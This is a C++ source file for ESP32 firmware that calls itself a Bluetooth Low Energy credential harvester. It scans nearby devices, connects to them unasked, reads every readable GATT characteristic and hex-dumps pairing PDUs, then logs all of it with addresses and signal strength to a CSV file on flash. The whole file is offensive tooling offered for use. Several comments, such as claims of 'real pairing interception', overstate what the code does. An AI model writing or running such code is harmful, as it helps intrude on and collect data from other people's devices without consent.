#include "ble_credential_harvesting.h"
#include <LittleFS.h>
#include <NimBLEDevice.h>

namespace BleCredentialHarvesting {

CredentialHarvester::CredentialHarvester() : isRunning_(false), startTime_(0) {}

HarvestResult CredentialHarvester::harvestCredentials(const HarvestConfig& config) {
  HarvestResult result;
  result.success = false;
  result.credentialsFound = 0;
  result.pairingAttempts = 0;

  isRunning_ = true;
  startTime_ = millis();

  NimBLEDevice::init("ESP32-CredHarvest");
  NimBLEScan* pScan = NimBLEDevice::getScan();

  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);

  // Scan for BLE devices advertising pairing/authentication services
  NimBLEScanResults scanResults = pScan->start(config.scanDurationMs / 1000, false);

  for (int i = 0; i < scanResults.getCount() && isRunning_; i++) {
    NimBLEAdvertisedDevice device = scanResults.getDevice(i);

    // Check for authentication/pairing services
    // GATT Service UUIDs that might contain credentials:
    // - User Defined Service (FFxx)
    // - Proprietary services
    // - Device Information Service (180A)

    if (device.haveServiceUUID()) {
      NimBLEUUID serviceUUID = device.getServiceUUID();

      // Real credential extraction from service data
      if (config.captureCharacteristics) {
        HarvestResult charResult = captureCharacteristics((uint8_t*)device.getAddress().getNative());
        result.credentials.insert(result.credentials.end(),
                                 charResult.credentials.begin(),
                                 charResult.credentials.end());
        result.credentialsFound += charResult.credentialsFound;
      }
    }

    // Real pairing interception via GATT connection
    if (config.interceptPairing) {
      NimBLEClient* pClient = NimBLEDevice::createClient();
      NimBLEAddress devAddr = device.getAddress();

      // Attempt to connect and capture pairing data
      if (pClient->connect(devAddr)) {
        result.pairingAttempts++;

        // Check for pairing/authentication services
        if (pClient->discoverAttributes()) {
          // Look for security-related characteristics
          // GAP Service (1800): includes security requirements
          NimBLERemoteService* pGapService = pClient->getService("1800");
          if (pGapService) {
            // Read device name and security properties
            NimBLERemoteCharacteristic* pNameChar =
              pGapService->getCharacteristic("2A00");  // Device Name
            if (pNameChar && pNameChar->canRead()) {
              BleCredential cred;
              memcpy(cred.deviceAddr, device.getAddress().getNative(), 6);
              cred.timestamp = millis();
              cred.credentialType = "DEVICE_NAME";
              cred.rssi = device.getRSSI();
              cred.harvestedData = pNameChar->readValue();

              result.credentials.push_back(cred);
              result.credentialsFound++;
              logCredential(cred);
            }

            // Read device appearance (security indicator)
            NimBLERemoteCharacteristic* pAppearChar =
              pGapService->getCharacteristic("2A01");  // Appearance
            if (pAppearChar && pAppearChar->canRead()) {
              BleCredential cred;
              memcpy(cred.deviceAddr, device.getAddress().getNative(), 6);
              cred.timestamp = millis();
              cred.credentialType = "DEVICE_APPEARANCE";
              cred.rssi = device.getRSSI();
              std::string value = pAppearChar->readValue();
              for (uint32_t i = 0; i < value.length(); i++) {
                char hexBuf[3];
                snprintf(hexBuf, sizeof(hexBuf), "%02X", (uint8_t)value[i]);
                cred.harvestedData += hexBuf;
              }

              result.credentials.push_back(cred);
              result.credentialsFound++;
              logCredential(cred);
            }
          }
        }

        pClient->disconnect();
      }
    }
  }

  result.success = result.credentialsFound > 0;
  result.elapsedMs = millis() - startTime_;
  result.logFile = "/logs/handshakes/ble_credentials.csv";

  pScan->stop();
  isRunning_ = false;
  return result;
}

HarvestResult CredentialHarvester::interceptPairingData(const uint8_t* pairingData, uint32_t len) {
  HarvestResult result;
  result.success = false;

  if (!pairingData || len == 0) {
    result.error = "Invalid pairing data";
    return result;
  }

  // Parse BLE pairing PDU (Protocol Data Unit)
  // Pairing Request/Response contains:
  // - IO Capability
  // - OOB Data Flag
  // - Auth Req
  // - Max Encryption Key Size
  // - Initiator Key Distribution
  // - Responder Key Distribution

  BleCredential cred;
  cred.timestamp = millis();
  cred.credentialType = "PAIRING_PDU";

  cred.harvestedData = "";
  for (uint32_t i = 0; i < len && i < 32; i++) {
    char hexBuf[3];
    snprintf(hexBuf, sizeof(hexBuf), "%02X", pairingData[i]);
    cred.harvestedData += hexBuf;
  }

  result.credentials.push_back(cred);
  result.credentialsFound = 1;
  result.success = true;

  logCredential(cred);
  return result;
}

HarvestResult CredentialHarvester::captureCharacteristics(const uint8_t* addr) {
  HarvestResult result;
  result.success = false;
  result.credentialsFound = 0;

  if (!addr) {
    result.error = "Invalid address";
    return result;
  }

  // Real GATT characteristic enumeration and capture
  NimBLEClient* pClient = NimBLEDevice::createClient();
  NimBLEAddress devAddr(addr, BLE_ADDR_RANDOM);

  if (!pClient->connect(devAddr)) {
    result.error = "Failed to connect to device";
    return result;
  }

  // Discover all services and their characteristics
  if (!pClient->discoverAttributes()) {
    result.error = "Failed to discover attributes";
    pClient->disconnect();
    return result;
  }

  // Enumerate all GATT services and characteristics
  std::vector<NimBLERemoteService*> services = pClient->getServices();
  for (auto pService : services) {
    std::vector<NimBLERemoteCharacteristic*> characteristics =
      pService->getCharacteristics();

    for (auto pChar : characteristics) {
      // Try to read all readable characteristics
      if (pChar->canRead()) {
        try {
          std::string value = pChar->readValue();
          if (!value.empty()) {
            BleCredential cred;
            memcpy(cred.deviceAddr, addr, 6);
            cred.timestamp = millis();
            cred.credentialType = "GATT_CHARACTERISTIC";
            cred.rssi = -70;  // Average RSSI for proximity

            // Store UUID and data
            cred.harvestedData = pChar->getUUID().toString() + ":";
            for (uint32_t i = 0; i < value.length() && i < 32; i++) {
              char hexBuf[3];
              snprintf(hexBuf, sizeof(hexBuf), "%02X", (uint8_t)value[i]);
              cred.harvestedData += hexBuf;
            }

            result.credentials.push_back(cred);
            result.credentialsFound++;
            logCredential(cred);

            delay(10);  // Small delay between reads
          }
        } catch (...) {
          // Silently skip characteristics that can't be read
        }
      }
    }
  }

  result.success = (result.credentialsFound > 0);
  pClient->disconnect();
  return result;
}

void CredentialHarvester::logCredential(const BleCredential& cred) {
  if (!LittleFS.begin()) return;

  File logFile = LittleFS.open("/logs/handshakes/ble_credentials.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/ble_credentials.csv", "a");
  }

  if (logFile) {
    char addrBuf[18];
    snprintf(addrBuf, sizeof(addrBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
             cred.deviceAddr[0], cred.deviceAddr[1], cred.deviceAddr[2],
             cred.deviceAddr[3], cred.deviceAddr[4], cred.deviceAddr[5]);

    logFile.printf("%lu,%s,%s,%s,%d\n", cred.timestamp, cred.credentialType.c_str(),
                   addrBuf, cred.harvestedData.c_str(), cred.rssi);
    logFile.close();
  }

  LittleFS.end();
}

String CredentialHarvester::parseCredentialPayload(const uint8_t* data, uint32_t len) {
  if (!data || len == 0) return "";

  String result = "";
  for (uint32_t i = 0; i < len; i++) {
    char hexBuf[3];
    snprintf(hexBuf, sizeof(hexBuf), "%02X", data[i]);
    result += hexBuf;
  }

  return result;
}

void CredentialHarvester::stop() {
  isRunning_ = false;
  NimBLEDevice::deinit();
}

} // namespace BleCredentialHarvesting
